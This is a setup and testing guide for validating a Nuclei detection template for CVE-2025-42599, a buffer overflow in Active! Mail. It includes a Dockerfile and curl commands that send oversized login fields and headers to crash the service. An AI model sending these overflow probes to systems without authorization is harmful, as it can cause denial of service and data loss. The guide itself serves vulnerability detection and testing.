# CVE-2025-42599 Test Environment Setup

## Overview
This document provides instructions for setting up a test environment to validate the CVE-2025-42599 Nuclei template for Active! Mail stack-based buffer overflow vulnerability.

## Prerequisites
- Docker installed
- Nuclei installed
- Vulnerable Active! Mail version 6.60.05008561 or earlier

## Test Environment Options

### Option 1: Docker Container (Recommended for Testing)

```dockerfile
# Dockerfile for Active! Mail vulnerable version
FROM ubuntu:20.04

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget \
    unzip \
    apache2 \
    php \
    libapache2-mod-php \
    && rm -rf /var/lib/apt/lists/*

# Download and install Active! Mail 6.60.05008561
WORKDIR /tmp
RUN wget -O active-mail.zip "https://example.com/active-mail-6.60.05008561.zip" \
    && unzip active-mail.zip \
    && cp -r active-mail/* /var/www/html/ \
    && chown -R www-data:www-data /var/www/html/

# Configure Apache
RUN a2enmod rewrite
COPY apache-config.conf /etc/apache2/sites-available/000-default.conf

# Expose port
EXPOSE 80

# Start Apache
CMD ["apache2ctl", "-D", "FOREGROUND"]
```

### Option 2: Virtual Machine Setup

1. Download Active! Mail 6.60.05008561 from vendor archives
2. Install on Windows Server 2016/2019 or Windows 10
3. Configure the mail service
4. Ensure the service is accessible on port 80/443

## Testing the Template

### 1. Basic Detection Test
```bash
# Test against vulnerable instance
nuclei -u http://target-ip -t http/cves/2025/CVE-2025-42599.yaml -debug

# Test with verbose output
nuclei -u http://target-ip -t http/cves/2025/CVE-2025-42599.yaml -v -debug
```

### 2. Validation Commands
```bash
# Check if Active! Mail is running
curl -I http://target-ip/

# Test basic overflow payload
curl -X POST http://target-ip/mail/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$(python3 -c 'print("A"*1024)')&password=test"

# Test with malformed headers
curl -X POST http://target-ip/mail/login \
  -H "X-Forwarded-For: $(python3 -c 'print("A"*1024)')" \
  -H "User-Agent: $(python3 -c 'print("B"*1024)')" \
  -d "username=test&password=test"
```

### 3. Expected Results

#### Positive Detection:
- HTTP 500/502/503 status codes
- "Internal Server Error" in response body
- "Buffer", "Overflow", or "Stack" in error messages
- Connection close headers
- Service crash or restart

#### Negative Detection:
- HTTP 200/401/403 status codes (normal responses)
- No error messages related to buffer overflow
- Service continues running normally

## Debug Information

### Template Debug Output
The template includes debug output that shows:
- Request/response details
- Payload variations used
- Matcher conditions met
- Extracted version information

### Manual Verification Steps
1. Check application logs for crash/error messages
2. Monitor system resources during testing
3. Verify service restart after overflow
4. Check for core dumps or crash reports

## Safety Considerations

⚠️ **WARNING**: This template is designed to trigger buffer overflows and may:
- Crash the target service
- Cause data loss
- Require service restart
- Generate system logs

**Only test against authorized systems in controlled environments.**

## Troubleshooting

### Common Issues:
1. **Template not detecting vulnerability**: Check if Active! Mail is actually running
2. **False positives**: Verify version is actually vulnerable
3. **Service not responding**: Check if overflow caused crash
4. **Network issues**: Verify firewall/network connectivity

### Debug Commands:
```bash
# Check service status
systemctl status active-mail

# View application logs
tail -f /var/log/active-mail/error.log

# Monitor system resources
htop
dmesg | tail -20
```

## References
- CVE-2025-42599: https://nvd.nist.gov/vuln/detail/CVE-2025-42599
- Active! Mail Documentation: [Vendor URL]
- Nuclei Template Documentation: https://nuclei.projectdiscovery.io/
